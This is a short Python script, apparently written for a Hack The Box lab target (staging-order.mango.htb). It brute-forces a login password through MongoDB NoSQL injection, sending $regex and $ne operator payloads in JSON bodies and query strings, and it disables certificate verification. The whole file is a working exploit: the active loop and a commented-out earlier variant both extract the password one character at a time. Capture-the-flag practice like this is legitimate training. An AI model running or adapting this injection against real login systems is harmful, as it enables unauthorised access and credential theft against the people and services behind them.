#!/usr/bin/env python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
url="http://staging-order.mango.htb/index.php"
#headers={'Content-Type': 'application/www-form-urlencoded'}
headers = {'Content-Type': 'application/json'}

#while True:
#    for c in string.printable:
#        if c not in ['+','|']:
#            payload='{username: {"$eq": "%s"}, password: {"$regex": "^..%s" }}' % (username, password + c)
#            req = requests.post(url, data = payload, headers = headers, verify = False, allow_redirects = False)
#            print(payload)
#            print(req)
#            if 'OK' in req.text or req.status_code == 302:
#                print("Found one more char : %s" % (password+c))
#                password += c




for char in string.printable:
    if char not in ['*','+','.','?','|', '#', '&', '$']:
        # Query string like a get parameter
        payload = '?username%5B%24eq%5D=mongo&password%2B%24regex%5D=^'+ char 
        
        # Json post request 
        jspayload='{"username": {"$ne": "admin"}, "password": {"$regex": "^%s" }}' % (char)
    
    else:
        # Query string like get parameter
        payload = '?username%5B%24eq%5D=mongo&password%5B%24regex%5D=^'+ '\\'+ char

        # Json post request 
        jspayload='{"username": {"$ne": "admin"}, "password": {"$regex": "^\\%s" }}' % (char)
        
    #print(payload)
    print(jspayload)
    
    query_url = url + payload
    
    #req = requests.post(query_url, data=payload, headers=headers, verify = False, allow_redirects = False)
    req = requests.post(query_url, data=jspayload, headers=headers, verify = False, allow_redirects = False)

    print(req)
    query_url = ''
    if req.status_code == 302:
        print(req.text)
        break 
